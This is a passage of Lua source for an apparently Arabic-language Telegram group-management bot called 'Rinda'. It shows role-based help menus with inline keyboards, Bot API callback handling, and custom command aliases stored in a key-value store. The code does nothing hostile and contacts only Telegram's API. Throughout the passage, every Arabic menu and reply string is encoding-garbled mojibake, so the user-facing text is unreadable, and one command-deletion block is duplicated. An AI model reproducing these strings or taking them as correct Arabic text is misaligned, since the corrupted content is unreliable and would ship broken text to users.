โ๏ธฐุชุบููุฑ ุงูุงูุฏู โข ูุชุบููุฑ ุงููููุดู
โ๏ธฐุชุนููู ุงูุงูุฏู โข ูุชุนููู ุงููููุดู
โ๏ธฐุญุฐู ุงูุงูุฏู โข ูุญุฐู ุงููููุดู
-----------------------------------------
โ๏ธฐุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โข โค
โ๏ธฐุงุทุฑุฏูู โข ุงูุงูุฏู ุจุงูุตูุฑู โข ุงูุงุจุฑุงุฌ
โ๏ธฐูุนุงูู ุงูุงุณูุงุก โข ุงูุงูุฑ ุงููุณุจ โข ุงูุทู
โ๏ธฐุงูุงูุฏู โข ุชุญููู ุงูุตูุบ โข ุงูุงูุฑ ุงูุชุญุดูุด
โ๏ธฐุฑุฏูุฏ ุงููุฏูุฑ โข ุฑุฏูุฏ ุงููุทูุฑ โข ุงูุชุญูู
โ๏ธฐุถุงููู โข ุญุณุงุจ ุงูุนูุฑ โข ุงูุฒุฎุฑูู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
keyboard = {} 
if SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุทูุฑูู โข",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
end
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local Rio = DataText:match('/HelpList4:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ููุณ ูุฏูู ุตูุงุญูุฉ ุงูุชุญูู ููุฐุง ุงูุงูุฑ .")..'&show_alert=true')
end
local Help = DevRio:get(Rinda..'Rio:Help4')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงูููุดุฆูู โข โค
-----------------------------------------
โ๏ธฐุชูุฒูู ุงููู
โ๏ธฐุงูููุฏูุง โข ุงูุณุญ
โ๏ธฐุชุนูู ุนุฏุฏ ุงูุญุฐู
โ๏ธฐุชุฑุชูุจ ุงูุงูุงูุฑ
โ๏ธฐุงุถู โข ุญุฐู โข ุงูุฑ
โ๏ธฐุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู
โ๏ธฐุงูุงูุงูุฑ ุงููุถุงูู
โ๏ธฐุงุถู ููุงุท โข ุจุงูุฑุฏ โข ุจุงูุงูุฏู
โ๏ธฐุงุถู ุฑุณุงุฆู โข ุจุงูุฑุฏ โข ุจุงูุงูุฏู
โ๏ธฐุฑูุน ููุธู โข ุชูุฒูู ููุธู
โ๏ธฐุงูููุธููู โข ุญุฐู ุงูููุธููู
โ๏ธฐุฑูุน ูุฏูุฑ โข ุชูุฒูู ูุฏูุฑ
โ๏ธฐุงููุฏุฑุงุก โข ุญุฐู ุงููุฏุฑุงุก
โ๏ธฐุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โข โค
โ๏ธฐูุฒููู โข ุงูุณุญ
โ๏ธฐุงูุญุธุฑ โข ุงููุชู
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุงูููุดุฆูู ุงูุงุณุงุณููู โข โค
-----------------------------------------
โ๏ธฐูุถุน ููุจ + ุงูููุจ
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุฑูุน
โ๏ธฐุฑูุน ููุดุฆ โข ุชูุฒูู ููุดุฆ
โ๏ธฐุงูููุดุฆูู โข ุญุฐู ุงูููุดุฆูู
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุดุฑู
โ๏ธฐุฑูุน ุจูู ุงูุตูุงุญูุงุช
โ๏ธฐุญุฐู ุงูููุงุฆู
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุงููุงูููู โข โค
-----------------------------------------
โ๏ธฐุฑูุน โข ุชูุฒูู โข ููุดุฆ ุงุณุงุณู
โ๏ธฐุญุฐู ุงูููุดุฆูู ุงูุงุณุงุณููู 
โ๏ธฐุงูููุดุฆูู ุงูุงุณุงุณููู 
โ๏ธฐุญุฐู ุฌููุน ุงูุฑุชุจ
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
keyboard = {} 
if SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุทูุฑูู โข",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
end
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local Rio = DataText:match('/HelpList5:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ููุณ ูุฏูู ุตูุงุญูุฉ ุงูุชุญูู ููุฐุง ุงูุงูุฑ .")..'&show_alert=true')
end
local Help = DevRio:get(Rinda..'Rio:Help5')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงููุทูุฑูู โข โค
-----------------------------------------
โ๏ธฐุงููุฑูุจุงุช
โ๏ธฐุงููุทูุฑูู
โ๏ธฐุงููุดุชุฑููู
โ๏ธฐุงูุงุญุตุงุฆูุงุช
โ๏ธฐุงููุฌููุนุงุช
โ๏ธฐุงุณู ุงูุจูุช + ุบุงุฏุฑ
โ๏ธฐุงุณู ุงูุจูุช + ุชุนุทูู
โ๏ธฐูุดู + -ุงูุฏู ุงููุฌููุนู
โ๏ธฐุฑูุน ูุงูู โข ุชูุฒูู ูุงูู
โ๏ธฐุงููุงูููู โข ุญุฐู ุงููุงูููู
-----------------------------------------
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุฏูุฑ ุนุงู
โ๏ธฐุญุฐู โข ุงููุฏุฑุงุก ุงูุนุงููู 
โ๏ธฐุฑูุน โข ุชูุฒูู โข ุงุฏูู ุนุงู
โ๏ธฐุญุฐู โข ุงูุงุฏูููู ุงูุนุงููู 
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูููุฒ ุนุงู
โ๏ธฐุญุฐู โข ุงููููุฒูู ุนุงู 
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุงููุทูุฑ ุงูุงุณุงุณู โข โค
-----------------------------------------
โ๏ธฐุชุญุฏูุซ
โ๏ธฐุงูุณูุฑูุฑ
โ๏ธฐุฑูุงุจุท ุงููุฑูุจุงุช
โ๏ธฐุชุญุฏูุซ ุฑููุฏุง
โ๏ธฐุชูุธูู ุงููุฑูุจุงุช
โ๏ธฐุชูุธูู ุงููุดุชุฑููู
โ๏ธฐุญุฐู ุฌููุน ุงููููุงุช
โ๏ธฐุชุนููู ุงูุงูุฏู ุงูุนุงู
โ๏ธฐุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู
โ๏ธฐุญุฐู ูุนูููุงุช ุงูุชุฑุญูุจ
โ๏ธฐุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ
โ๏ธฐุบุงุฏุฑ + -ุงูุฏู ุงููุฌููุนู
โ๏ธฐุชุนููู ุนุฏุฏ ุงูุงุนุถุงุก + ุงูุนุฏุฏ
โ๏ธฐุญุธุฑ ุนุงู โข ุงูุบุงุก ุงูุนุงู
โ๏ธฐูุชู ุนุงู โข ุงูุบุงุก ุงูุนุงู
โ๏ธฐูุงุฆูู ุงูุนุงู โข ุญุฐู ูุงุฆูู ุงูุนุงู
โ๏ธฐูุถุน โข ุญุฐู โข ุงุณู ุงูุจูุช
โ๏ธฐุงุถู โข ุญุฐู โข ุฑุฏ ุนุงู
โ๏ธฐุฑุฏูุฏ ุงููุทูุฑ โข ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ
โ๏ธฐุชุนููู โข ุญุฐู โข ุฌูุจ โข ุฑุฏ ุงูุฎุงุต
โ๏ธฐุฌูุจ ูุณุฎู ุงููุฑูุจุงุช
โ๏ธฐุฑูุน ุงููุณุฎู + ุจุงูุฑุฏ ุนูู ุงูููู
โ๏ธฐุชุนููู โข ุญุฐู โข ููุงุฉ ุงูุงุดุชุฑุงู
โ๏ธฐุฌูุจ ูููุดู ุงูุงุดุชุฑุงู
โ๏ธฐุชุบููุฑ โข ุญุฐู โข ูููุดู ุงูุงุดุชุฑุงู
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุทูุฑ
โ๏ธฐุงููุทูุฑูู โข ุญุฐู ุงููุทูุฑูู
โ๏ธฐุฑูุน โข ุชูุฒูู โข ูุทูุฑ ุซุงููู
โ๏ธฐุงูุซุงููููู โข ุญุฐู ุงูุซุงููููู
โ๏ธฐุชุนููู โข ุญุฐู โข ูููุดุฉ ุงูุงูุฏู
โ๏ธฐุงุฐุงุนู ูููู ุจุงูุชูุฌูู โข ุจุงูุฑุฏ
-----------------------------------------
โ๏ธฐุชูุนูู ููู + ุงุณู ุงูููู
โ๏ธฐุชุนุทูู ููู + ุงุณู ุงูููู
โ๏ธฐุชูุนูู โข ุชุนุทูู + ุงูุงูุฑ โข โค
โ๏ธฐุงูุงุฐุงุนู โข ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู
โ๏ธฐุชุฑุญูุจ ุงูุจูุช โข ุงููุบุงุฏุฑู
โ๏ธฐุงูุจูุช ุงูุฎุฏูู โข ุงูุชูุงุตู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
keyboard = {} 
if SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
end
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local Rio = DataText:match('/HelpList6:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Rinda..'Rio:Help6')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงูุงุนุถุงุก โข โค
-----------------------------------------
โ๏ธฐุงูุณูุฑุณ โข ูููุนู โข ุฑุชุจุชู โข ูุนูููุงุชู 
โ๏ธฐุฑููู โข ููุจู โข ูุจุฐุชู โข ุตูุงุญูุงุชู โข ุบูููู
โ๏ธฐูููุฒ โข ูุชุญุฑูู โข ุตูุฑู โข ุฑูููุณ โข ููู โข ูุณูุณู โข ุงููู
โ๏ธฐุฑุณุงุฆูู โข ุญุฐู ุฑุณุงุฆูู โข ุงุณูู โข ูุนุฑูู 
โ๏ธฐุงูุฏู โขุงูุฏูู โข ุฌูุงุชู โข ุฑุงุณููู โข ุงูุงูุนุงุจ 
โ๏ธฐููุงุทู โข ุจูุน ููุงุทู โข ุงูููุงููู โข ุฒุฎุฑูู 
โ๏ธฐุฑุงุจุท ุงูุญุฐู โข ูุฒููู โข ุงุทุฑุฏูู โข ุงููุทูุฑ 
โ๏ธฐููู ุถุงููู โข ูุดุงูุฏุงุช ุงูููุดูุฑ โข ุงูุฑุงุจุท 
โ๏ธฐุงูุฏู ุงููุฌููุนู โข ูุนูููุงุช ุงููุฌููุนู 
โ๏ธฐูุณุจู ุงูุญุจ โข ูุณุจู ุงููุฑู โข ูุณุจู ุงูุบุจุงุก 
โ๏ธฐูุณุจู ุงูุฑุฌููู โข ูุณุจู ุงูุงููุซู โข ุงูุชูุงุนู
-----------------------------------------
โ๏ธฐููุจู + ุจุงูุฑุฏ
โ๏ธฐููู + ุงููููู
โ๏ธฐุฒุฎุฑูู + ุงุณูู
โ๏ธฐุจุฑุฌ + ููุน ุงูุจุฑุฌ
โ๏ธฐูุนูู ุงุณู + ุงูุงุณู
โ๏ธฐุจูุณู โข ุจูุณูุง โข ุจุงูุฑุฏ
โ๏ธฐุงุญุณุจ + ุชุงุฑูุฎ ูููุงุฏู
โ๏ธฐุตูุงุญูุงุชู โข ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธฐุงูุฏู โข ูุดู  โข ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธฐุชุญููู + ุจุงูุฑุฏ โข ุตูุฑู โข ููุตู โข ุตูุช โข ุจุตูู
โ๏ธฐุงูุทู + ุงูููุงู ุชุฏุนู ุฌููุน ุงููุบุงุช ูุน ุงูุชุฑุฌูู ููุนุฑุจู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
keyboard = {} 
if SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงููุทูุฑูู โข",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
else
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
end
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevRio:get(Rinda.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevRio:get(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevRio:del(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevRio:del(Rinda.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:srem(Rinda.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ุงูุงูุฑ ูู ุงููุฌููุนู", 1, 'html')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงููุฌุฏ ุงูุฑ ุจูุฐุง ุงูุงุณู", 1, 'html')
end
DevRio:del(Rinda.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevRio:get(Rinda..'Rio:NameBot') or "ุฑููุฏุง")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(Rinda..'Rio:NameBot') or "ุฑููุฏุง")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevRio:get(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevRio:get(Rinda.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevRio:set(Rinda.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ุงูุงูุฑ ุงูุฌุฏูุฏ", 1, 'html')
DevRio:del(Rinda.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevRio:set(Rinda.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevRio:get(Rinda.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevRio:get(Rinda.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงูุงูุฑ", 1, 'html')
DevRio:del(Rinda.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "ุงูุงูุงูุฑ ุงููุถุงูู" and ChCheck(msg) then
local List = DevRio:smembers(Rinda.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "โ๏ธฐูุงุฆูุฉ ุงูุงูุงูุฑ ุงููุถุงูู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
Cmds = DevRio:get(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") โข {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "โ๏ธฐูุงุชูุฌุฏ ุงูุงูุฑ ูุถุงูู ูู ุงููุฌููุนู"
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุงูุงูุฑ ุงููุถุงูู โข",callback_data="/DelCmd:"..msg.sender_user_id_},{text="โข ุชุฑุชูุจ ุงูุงูุงูุฑ โข",callback_data="/SetCmd:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(t or List).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "ุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู" and ChCheck(msg) or text == "ุญุฐู ุงูุงูุงูุฑ" and ChCheck(msg) or text == "ูุณุญ ุงูุงูุงูุฑ ุงููุถุงูู" and ChCheck(msg) then
local List = DevRio:smembers(Rinda.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(Rinda.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู ูู ุงููุฌููุนู", 1, 'html')
end
if text == "ุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู" and ChCheck(msg) or text == "ุญุฐู ุงูุงูุงูุฑ" and ChCheck(msg) or text == "ูุณุญ ุงูุงูุงูุฑ ุงููุถุงูู" and ChCheck(msg) then
local List = DevRio:smembers(Rinda.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(Rinda.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู ูู ุงููุฌููุนู", 1, 'html')
end
if text == "ุชุฑุชูุจ ุงูุงูุงูุฑ" and Constructor(msg) and ChCheck(msg) then
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุง","ุงูุฏู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุง")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ู","ุฑูุน ูููุฒ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุงุฏ","ุฑูุน ุงุฏูู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุงุฏ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ูุฏ","ุฑูุน ูุฏูุฑ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ูุฏ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ูู","ุฑูุน ููุดุฆ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ูู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุงุณ","ุฑูุน ููุดุฆ ุงุณุงุณู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุงุณ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ูุท","ุฑูุน ูุทูุฑ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ูุท")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุซุงููู","ุฑูุน ูุทูุฑ ุซุงููู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุซุงููู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุชู","ุชูุฒูู ุงููู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุชู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุชุนุท","ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุชุนุท")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุชูุน","ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุชูุน")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุฑ","ุงูุฑุงุจุท")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุฑ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุฑุฑ","ุฑุฏูุฏ ุงููุฏูุฑ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุฑุฑ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุุ","ูุณุญ ุงูููุชูููู")
